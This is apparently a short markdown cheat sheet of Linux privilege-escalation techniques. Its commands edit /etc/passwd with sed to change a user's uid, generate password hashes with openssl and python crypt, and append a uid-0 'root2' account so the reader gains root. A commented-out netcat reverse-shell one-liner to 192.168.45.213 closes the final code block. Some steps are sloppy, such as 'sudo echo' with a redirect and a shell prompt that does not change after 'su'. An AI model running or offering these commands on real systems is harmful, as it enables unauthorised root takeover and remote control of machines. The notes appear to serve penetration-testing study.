# Basic Elevation of Privilage


## With sudo 

* Take a closer look of the file permissions 

1. Check /etc/passwd

2. try to add a local user to it using the `adduser` command, 

```sh
$ sudo adduser pancho
Enter new UNIX password: 
...
```
3. change its uid to another with sudo permissions, 

4. `su` to that user, and then try accessing the files

5. We can change its uid to sudo using `sed ‘s/newUserId/SudoAccessId/g’ -i (replace in-place) -e (execute; the 's/...//') /etc/passwd`

```sh
$ sudo sed -i -e 's/1001/1014/g' /etc/passwd
$ cat /etc/passwd | grep pancho
pancho:x:1014:1014:,,,:/home/pancho:/bin/bash
```

6. `su` to the newly added pancho user, verify that our UUID has indeed changed, and then try accessing files. 

```sh
marcus$ su pancho
marcus$ id
uid=1014(pancho) gid=1014 groups=1014
$ cat creds.txt
m32n42lk4n23974guiob23l4tr
```


## Without sudo

* exploiting editable /etc/passwd

This file is normally editable by the root user, but if for whatever reason this was changed to allow normal users to edit it, this could result in a full system compromise.


1. Generating a new User Hash

```sh
# option 1: openssl passwd (built-in utility)
# openssl passwd -1 -salt [hash salt] [password to be used]
openssl passwd -1 -salt pan pancho123
$1$pan$pTiB1gfo8xQpdHGy4SUFD1

# option 2: python3
# python3 -c 'import crypt; print(crypt.crypt([password], "$6$[hash salt]"))'
python3 -c 'import crypt; print(crypt.crypt("pancho123", "$6$pan"))'

```

2. Exploiting writable passwd file

Once a user hash has been generated, this can be added to the passwd file. 

```sh
hacked:[hashed-passwd]/:0:0:root:/root:/bin/bash

sudo echo 'root2:$1$pan$pTiB1gfo8xQpdHGy4SUFD1:0:0:root:/root:/bin/bash' >> /etc/passwd

# sudo sed -i -e 's/love:x:/love:$1$pan$pTiB1gfo8xQpdHGy4SUFD1:/g' /etc/passwd

# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.213 1234 > /tmp/f
```

Alternatively, the root hash can be changed by replacing the “x” in the passwd file.
